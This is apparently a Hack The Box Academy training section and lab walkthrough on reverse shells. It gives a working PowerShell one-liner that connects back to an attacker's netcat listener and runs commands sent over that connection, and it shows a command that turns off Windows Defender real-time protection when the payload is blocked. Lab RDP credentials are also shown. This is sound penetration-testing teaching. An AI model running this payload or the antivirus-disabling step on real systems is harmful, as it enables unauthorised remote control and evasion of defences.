

---

With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.

#### Reverse Shell Example

![Reverse shell setup: Target 10.10.14.20 connects back to pentester's system 10.10.14.15:1337 using netcat command.](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario. As seen in the image above, we are starting a listener for a reverse shell on our attack box and using some method (example: `Unrestricted File Upload`, `Command Injection`, etc..) to force the target to initiate a connection with our target box, effectively meaning our attack box becomes the server and the target becomes the client.

We don't always need to re-invent the wheel when it comes to payloads (commands & code) we intend to use when attempting to establish a reverse shell with a target. There are helpful tools that infosec veterans have put together to assist us. [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement. We should be mindful that many admins are aware of public repositories and open-source resources that penetration testers commonly use. They can reference these repos as part of their core considerations on what to expect from an attack and tune their security controls accordingly. In some cases, we may need to customize our attacks a bit.

Let's work hands-on with this to understand these concepts better.

---

## Hands-on With A Simple Reverse Shell in Windows

With this walkthrough, we will be establishing a simple reverse shell using some PowerShell code on a Windows target. Let's start the target and begin.

We can start a Netcat listener on our attack box as the target spawns.

#### Server (`attack box`)

  Reverse Shells

```shell-session
xF1NN@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

This time around with our listener, we are binding it to a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) (`443`), this port usually is for `HTTPS` connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port. Detailed firewall evasion is outside of the scope of this module, so we will only briefly touch on detection & evasion techniques throughout the module, as well as in the dedicated section at the end.

Once the Windows target has spawned, let's connect using RDP.

Netcat can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as our tool on the Windows side. We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start. That said, it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to.

`What applications and shell languages are hosted on the target?`

This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.

On the Windows target, open a command prompt and copy & paste this command:

#### Client (target)

  Reverse Shells

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

 Note: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target. In these cases, we may want to paste into Notepad on the target, then copy & paste from inside the target.

Please take a close look at the command and consider what we need to change for this to allow us to establish a reverse shell with our attack box. This PowerShell code can also be called `shell code` or our `payload`. Delivering this payload onto the Windows system was pretty straightforward, considering we have complete control of the target for demonstration purposes. As this module progresses, we will notice the difficulty increases in how we deliver the payload onto targets.

`What happened when we hit enter in command prompt?`

#### Client (target)

  Reverse Shells

```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

The `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):

#### Disable AV

  Reverse Shells

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, attempt to execute the code again.

#### Server (attack box)

  Reverse Shells

```shell-session
xF1NN@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

Back on our attack box, we should notice that we successfully established a reverse shell. We can see this by the change in the prompt that starts with `PS` and our ability to interact with the OS and file system. Try running some standard Windows commands to practice a bit.

Now, let's test our knowledge with some challenge questions.


---

# Reverse Shells

## Question 1

### "When establishing a reverse shell session with a target, will the target act as a client or server?"

Students will know after reading the section's content that the target will act as a `client`:

![Shells_&_Payloads_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_2.png)

Answer: {hidden}

# Reverse Shells

## Question 2

### "Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box."

Students first need to spawn the target machine, then use `xfreerdp` to connect to it via RDP using Pwnbox/`PMVPN` with the credentials `htb-student:HTB_@cademy_stdnt!`::

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

  Reverse Shells

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.201.51 /u:htb-student /p:HTB_@cademy_stdnt!

[00:46:45:893] [75846:75847] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[00:46:45:893] [75846:75847] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
<SNIP>
```

Students then will have access to the Windows target machine:

![Shells_&_Payloads_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_3.png)

To establish a reverse shell session, students need to start a privileged `netcat` listener on port 443 using Pwnbox/`PMVPN`:

Code: shell

```shell
sudo nc -lvnp 443
```

  Reverse Shells

```shell-session
┌─[eu-academy-2]─[10.10.15.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nc -lvnp 443

listening on [any] 443 ...
```

Then, on the Windows target machine, students need to use a PowerShell reverse shell command to connect back to the listener on port 443 in Pwnbox/`PMVPN`:

Code: powershell

```powershell
PowerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('PWNIP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

  Reverse Shells

```powershell-session
C:\Users\htb-student\Desktop>PowerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.49',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

After executing the reverse shell call-back command on the Windows target machine, students will receive the reverse shell on their Pwnbox/`PMVPN`:

![Shells_&_Payloads_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_4.png)

However, in case students get an error message of Windows Defender stopping their execution of the command:

  Reverse Shells

```powershell-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.15.49',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Students need to open PowerShell as "Administrator" and disable Windows Defender from using real-time protection:

Code: powershell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

  Reverse Shells

```powershell-session
PS C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true
```

![Shells_&_Payloads_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/12/Shells_&_Payloads_Walkthrough_Image_5.png)

Subsequently, students need to rerun the reverse shell call-back command on the Windows target machine to receive their reverse shell session.

At last, students need to issue the `hostname` command and find the answer:

Code: powershell

```powershell
hostname
```

  Reverse Shells

```powershell-session
PS C:\Users\htb-student> hostname

Shells-Win10
```

Answer: {hidden}
